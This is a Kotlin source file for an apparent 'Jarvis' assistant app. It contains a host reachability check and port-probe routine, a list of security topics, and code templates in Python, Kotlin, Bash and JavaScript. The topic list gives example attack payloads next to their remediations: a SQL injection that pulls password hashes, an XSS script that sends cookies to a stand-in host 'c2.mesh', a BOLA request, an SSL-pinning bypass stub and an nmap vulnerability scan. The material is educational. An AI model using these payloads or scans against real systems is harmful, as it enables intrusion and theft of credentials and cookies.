package com.example.tech

import com.example.model.DiagnosticReport
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.net.InetAddress
import java.net.InetSocketAddress
import java.net.Socket

class TechDiagnosticEngine {

  suspend fun runNetworkDiagnostic(host: String): DiagnosticReport = withContext(Dispatchers.IO) {
    val cleanHost = host.trim().replace(Regex("^https?://"), "").replace(Regex("/.*$"), "")
    val startTime = System.currentTimeMillis()
    var reachable = false
    var latency: Long? = null

    try {
      val inet = InetAddress.getByName(cleanHost)
      reachable = inet.isReachable(2000)
      if (reachable) {
        latency = System.currentTimeMillis() - startTime
      } else {
        // Socket probe fallback for ping check on port 80/443
        val testSocket = Socket()
        testSocket.connect(InetSocketAddress(cleanHost, 443), 2000)
        testSocket.close()
        latency = System.currentTimeMillis() - startTime
        reachable = true
      }
    } catch (_: Exception) {
      reachable = false
    }

    val portsToCheck = listOf(80, 443, 22, 8080, 53)
    val openPorts = mutableListOf<Int>()

    for (port in portsToCheck) {
      try {
        Socket().use { socket ->
          socket.connect(InetSocketAddress(cleanHost, port), 600)
          openPorts.add(port)
        }
      } catch (_: Exception) {
        // Port closed / filtered
      }
    }

    val notes = mutableListOf<String>()
    if (openPorts.contains(22)) {
      notes.add("SSH port 22 exposed: Verify key-based auth (Ed25519) and fail2ban rate-limiting.")
    }
    if (openPorts.contains(80) && !openPorts.contains(443)) {
      notes.add("Plaintext HTTP (80) active without TLS 443. Enforce HSTS and TLS 1.3.")
    }
    if (openPorts.contains(8080)) {
      notes.add("Secondary HTTP port 8080 open. Potential staging admin interface or development proxy.")
    }
    if (notes.isEmpty()) {
      notes.add("Target perimeter demonstrates solid surface hardening. No anomalous open telemetry ports.")
    }

    DiagnosticReport(
      targetHost = cleanHost,
      pingLatencyMs = latency,
      status = if (reachable || openPorts.isNotEmpty()) "Target Active & Responding" else "Host Unreachable / ICMP Blocked",
      openPorts = openPorts,
      vulnerabilityNotes = notes,
      protocolSummary = "IP: $cleanHost | Active Ports: ${openPorts.joinToString(", ")} | Latency: ${latency ?: 0}ms"
    )
  }

  fun getEthicalHackingTopics(): List<SecurityTopic> = listOf(
    SecurityTopic(
      title = "SQL Injection (SQLi) & Defense",
      category = "Web Application Security",
      description = "Tainted input concatenation into SQL interpreters leading to arbitrary database exfiltration.",
      payloadExample = "' UNION SELECT null, username, password_hash FROM sys_users WHERE '1'='1' --",
      remediation = "Use Parameterized Queries / Prepared Statements (e.g. PDO, Room, SQLAlchemy, PreparedStatement). Never interpolate raw string variables."
    ),
    SecurityTopic(
      title = "Cross-Site Scripting (XSS) & CSP",
      category = "Client-Side Security",
      description = "Execution of malicious JavaScript within the victim's authenticated browser context.",
      payloadExample = "<script>fetch('https://c2.mesh/log?c='+document.cookie)</script>",
      remediation = "Context-aware HTML/Attribute escaping, Strict Content-Security-Policy (CSP) headers, and HttpOnly Secure SameSite cookie flags."
    ),
    SecurityTopic(
      title = "Broken Object Level Authorization (BOLA)",
      category = "API & Cloud Security",
      description = "OWASP API #1 vulnerability. User manipulates an object ID in API endpoints to access unauthorized records.",
      payloadExample = "GET /api/v1/users/10429/records HTTP/1.1\nAuthorization: Bearer <Victim_Token_Mismatch>",
      remediation = "Enforce server-side authorization matrices checking `user.id == record.owner_id` on every database fetch, regardless of client routing."
    ),
    SecurityTopic(
      title = "Android APK Reverse Engineering & Smali",
      category = "Mobile App Security",
      description = "Decompilation of Dalvik bytecode into Smali/Java to locate hardcoded secrets, bypass SSL pinning, or patch root detection.",
      payloadExample = "# Frida hook to bypass SSL Pinning:\nJava.perform(function() {\n  var X509TrustManager = Java.use('javax.net.ssl.X509TrustManager');\n  // Override verify checks\n});",
      remediation = "ProGuard/R8 obfuscation, Certificate Transparency + dynamic TrustManager pinning, SafetyNet/Play Integrity API validation, and zero hardcoded secrets."
    ),
    SecurityTopic(
      title = "Network Port Scanning & Reconnaissance",
      category = "Infrastructure Security",
      description = "Mapping active attack surfaces, OS detection, and banner grabbing via SYN/ACK socket packets.",
      payloadExample = "nmap -sS -sV -p 1-65535 -T4 --script vuln target.infrastructure.com",
      remediation = "Drop unsolicited packets via iptables/nftables, disable legacy services, bind admin daemons to 127.0.0.1 or WireGuard VPN meshes."
    )
  )

  fun getCodeGeneratorTemplates(): List<CodeTemplate> = listOf(
    CodeTemplate(
      language = "Python",
      title = "FastAPI Asynchronous Microservice",
      description = "Production-ready asynchronous REST backend with JWT verification and Pydantic validation.",
      code = """
import jwt
from fastapi import FastAPI, Depends, HTTPException, status
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from pydantic import BaseModel, EmailStr

app = FastAPI(title="Jarvis Neural Microservice", version="2.0.0")
security = HTTPBearer()
SECRET_KEY = "SECURE_KEY_MANAGED_VIA_ENV"

class TelemetryPayload(BaseModel):
    device_id: str
    battery_level: int
    system_mode: str
    is_secure: bool

@app.get("/health")
async def health_check():
    return {"status": "optimal", "ai_core": "Jarvis AI", "directive": "absolute_execution"}

@app.post("/api/v1/telemetry")
async def log_telemetry(data: TelemetryPayload, creds: HTTPAuthorizationCredentials = Depends(security)):
    try:
        payload = jwt.decode(creds.credentials, SECRET_KEY, algorithms=["HS256"])
        return {"acknowledged": True, "node": data.device_id, "operator": payload.get("sub")}
    except jwt.PyJWTError:
        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="Invalid authorization token")
""".trimIndent()
    ),
    CodeTemplate(
      language = "Kotlin",
      title = "Jetpack Compose Reactive StateFlow",
      description = "Clean Architecture ViewModel and StateFlow observer with Coroutines.",
      code = """
class JarvisCoreViewModel(
    private val telemetryProvider: TelemetryProvider
) : ViewModel() {

    private val _uiState = MutableStateFlow<UiState>(UiState.Idle)
    val uiState: StateFlow<UiState> = _uiState.asStateFlow()

    fun triggerProtocol(command: String) {
        viewModelScope.launch {
            _uiState.value = UiState.Executing(command)
            try {
                val result = withContext(Dispatchers.IO) {
                    // Execute non-blocking computational routine
                    "Protocol executed with 100% precision, Boss."
                }
                _uiState.value = UiState.Success(result)
            } catch (e: Exception) {
                _uiState.value = UiState.Error(e.localizedMessage ?: "Unknown fault")
            }
        }
    }
}
""".trimIndent()
    ),
    CodeTemplate(
      language = "Bash",
      title = "Hardened Linux Server Audit Script",
      description = "Automated forensic audit of open listening sockets, failed SSH attempts, and suid binaries.",
      code = """
#!/usr/bin/env bash
set -euo pipefail

echo "========================================="
echo "   JARVIS AUTOMATED HARDENING AUDIT     "
echo "========================================="

echo "[*] Checking listening TCP/UDP sockets..."
ss -tulwnp

echo "[*] Auditing SUID/SGID root binaries..."
find / -perm /6000 -type f 2>/dev/null | grep -v "/proc" || true

echo "[*] Recent failed authentication attempts:"
grep "Failed password" /var/log/auth.log 2>/dev/null | tail -n 10 || echo "No auth logs reachable."

echo "[*] Verifying firewall rules:"
command -v ufw >/dev/null && ufw status verbose || iptables -L -n -v --line-numbers
echo "[✓] Audit completed. All findings logged to Jarvis console."
""".trimIndent()
    ),
    CodeTemplate(
      language = "JavaScript",
      title = "Node.js WebSocket Real-Time Stream",
      description = "High-performance WebSocket server with heartbeat pulse and client broadcast.",
      code = """
const { WebSocketServer } = require('ws');
const wss = new WebSocketServer({ port: 8080 });

console.log('[JARVIS] WebSocket Stream active on port 8080');

wss.on('connection', (ws) => {
  ws.isAlive = true;
  ws.on('pong', () => { ws.isAlive = true; });

  ws.send(JSON.stringify({ event: 'CONNECTED', agent: 'Jarvis AI', status: 'READY' }));

  ws.on('message', (data) => {
    try {
      const payload = JSON.parse(data);
      console.log(`[EXECUTE] Processing command: ` + payload.action);
      // Echo or process
      ws.send(JSON.stringify({ event: 'ACK', status: 'EXECUTED', timestamp: Date.now() }));
    } catch (err) {
      ws.send(JSON.stringify({ error: 'INVALID_PAYLOAD' }));
    }
  });
});

setInterval(() => {
  wss.clients.forEach((ws) => {
    if (!ws.isAlive) return ws.terminate();
    ws.isAlive = false;
    ws.ping();
  });
}, 30000);
""".trimIndent()
    )
  )
}

data class SecurityTopic(
  val title: String,
  val category: String,
  val description: String,
  val payloadExample: String,
  val remediation: String
)

data class CodeTemplate(
  val language: String,
  val title: String,
  val description: String,
  val code: String
)
